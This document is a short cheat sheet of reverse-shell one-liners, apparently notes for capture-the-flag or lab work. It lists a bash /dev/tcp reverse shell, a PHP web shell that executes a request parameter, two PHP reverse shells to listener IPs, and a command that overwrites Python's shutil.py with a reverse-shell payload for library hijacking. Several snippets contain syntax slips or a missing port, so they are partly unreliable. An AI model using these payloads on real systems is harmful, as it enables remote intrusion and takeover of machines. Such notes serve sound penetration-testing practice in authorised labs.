### Oneliner Bash
```css
bash -c "bash -i >& /dev/tcp/10.8.203.6/9001 0>&1"
```


### Oneliner cmd desde url
```css
<?php 
        echo "<pre>" . shell_exec($_REQUEST['cmd']>
?>
```

### Oneliner php
```python
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.8.203.6/7890 0>&1'"):
```

### Oneliner php
```python
<?php
    system("bash -c 'bash -i >& /dev/tcp/10.10.14.85/443 0>&1'")
?>
```

### Oneliner python
```python
echo "import os; os.system(\"bash -c 'bash -i >& /dev/tcp/10.8.203.6 0>&1'\")" > /usr/lib/python3.8/shutil.py
```